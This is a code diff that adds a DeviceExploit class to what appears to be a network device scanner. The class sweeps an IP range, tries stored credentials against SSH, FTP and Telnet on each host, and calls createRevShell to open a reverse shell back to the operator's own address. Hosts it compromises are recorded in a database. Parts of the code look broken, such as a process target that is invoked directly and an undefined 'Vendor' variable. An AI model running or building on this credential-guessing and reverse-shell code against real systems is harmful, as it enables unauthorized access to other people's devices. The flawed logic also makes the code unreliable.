@@ -5,9 +5,11 @@ import ipaddress
 import multiprocessing as mp
 
 from sqlalchemy import *
-from .scanners.scanner import ProtocolScanner
+from .scanners.scanner import ProtocolScanner, ProtocolExploiter
 from .scanners.ssh import SSHScanner
+from .scanners.ssh import SSHExploiter
 from .scanners.ftp import FTPScanner
+from .scanners.ftp import FTPExploiter
 from .scanners.telnet import TelnetScanner
 from .scanners.rdp import RDPscanner
 
@@ -56,7 +58,21 @@ class Credentials():
         return self.password
 
 
+
+
 class ScanResults():
+    def __init__(self, timestamp, vulnerable, IPAddress, deviceName, portNumber, protocolName, os, vendor, MAC):
+        self.timestamp = timestamp
+        self.vulnerable = vulnerable
+        self.IPAddress = IPAddress
+        self.deviceName = deviceName
+        self.portNumber = portNumber
+        self.protocolName = protocolName
+        self.os = os
+        self.vendor = vendor
+        self.MAC = MAC
+
+class ExploitResults():
     def __init__(self, timestamp, vulnerable, IPAddress, deviceName, portNumber, protocolName, os, vendor, MAC):
         self.timestamp = timestamp
         self.vulnerable = vulnerable
@@ -177,6 +193,118 @@ class DeviceScanner():
         # Display scan results
         print(self.scanResults)
         return None
+
+
+class DeviceExploit():
+    def __init__(self):
+        self.admin = Admin("admin name", "admin email", Credentials("admin", "password"))
+        manager = mp.Manager()
+        self.exploitResults = manager.list()
+        self.db = DatabaseHandler()
+
+    def scanRange(self, startIP, endIP):
+        try:
+            start_IP = ipaddress.IPv4Address(startIP)
+            end_IP = ipaddress.IPv4Address(endIP)
+        except:
+            return "invalidIP"
+
+        start_IP = ipaddress.IPv4Address(startIP)
+        end_IP = ipaddress.IPv4Address(endIP)
+        if start_IP > end_IP:
+            return "invalidIP"
+
+        processes = [mp.Process(target=self.attemptExploit(IPAddress), args=(IPAddress,)) for IPAddress in
+                     range(int(start_IP), int(end_IP + 1))]
+
+        for p in processes:
+            # print("Starting process")
+            p.start()
+
+        for p in processes:
+            p.join()
+
+        return self.exploitResults
+
+    def attemptExploit(self, IPAddress):
+        myIP = ni.ifaddresses('eth0')
+        IPAddress = str(ipaddress.IPv4Address(IPAddress))
+        MAC = get_mac_address(ip="{}".format(IPAddress))
+        try:
+            socket.gethostbyaddr(IPAddress)
+        except socket.herror:
+            print("[-] Unknown host {0}".format(IPAddress))
+            return
+        protocols = ["SSH", "FTP", "Telnet"]
+        for protocol in protocols:
+            # print(IPAddress, protocol)
+            if ProtocolExploiter(protocol, getPort(protocol), IPAddress, MAC).isPortOpen() != 0:
+                currentResult = {
+                    "vulnerable": "Port Closed",
+                    "timestamp": str(currentTime()),
+                    "ip": IPAddress,
+                    "port": getPort(protocol),
+                    "protocol": protocol,
+                    "os": "NA",
+                    "vendor": "NA",
+                    "device": "NA",
+                    "mac": MAC
+                }
+                self.exploitResults.append(currentResult)
+                print(currentResult)
+                continue
+            protocolExploiter = globals()[protocol + "Exploiter"](protocol, getPort(protocol), IPAddress, MAC)
+            credentials = self.db.getCredentialsFromDB()
+            # checking all username and passwords in DB
+            detected = False
+            for cred in credentials:
+                if detected:
+                    break
+                exploitResults = protocolExploiter.createRevShell(cred, myIP)
+                curTime = currentTime()
+                try:
+                    parsedEvidence = parseEvidence(exploitResults)
+                    currentResult = {
+                        "vulnerable": "Yes",
+                        "timestamp": str(curTime),
+                        "ip": IPAddress,
+                        "port": getPort(protocol),
+                        "protocol": protocol,
+                        "os": parsedEvidence["os"],
+                        "vendor": "NA",
+                        "device": parsedEvidence["dev"],
+                        "mac": MAC
+                    }
+                    detected = True
+                    self.db.insertIntoScanResults(curTime, "Yes", IPAddress, parsedEvidence["dev"], getPort(protocol),
+                                                  protocol, parsedEvidence["os"], Vendor, MAC)
+                    self.exploitResults.append(currentResult)
+                    print(currentResult)
+                except:
+                    continue
+            if detected is False:
+                currentResult = {
+                    "vulnerable": "No",
+                    "timestamp": str(currentTime()),
+                    "ip": IPAddress,
+                    "port": getPort(protocol),
+                    "protocol": protocol,
+                    "os": "NA",
+                    "vendor": "NA",
+                    "device": "NA",
+                    "mac": getMAC(IPAddress)
+
+                }
+                self.db.insertIntoScanResults(currentTime(), "No", IPAddress, "NA", getPort(protocol), protocol, None, resolveVendor(MAC), MAC)
+                print(currentResult)
+                self.exploitResults.append(currentResult)
+
+    def displayExploitScanResuts(self):
+        # Display scan results
+        print(self.exploitResults)
+        return None
+
+
 
 
 class DatabaseHandler():
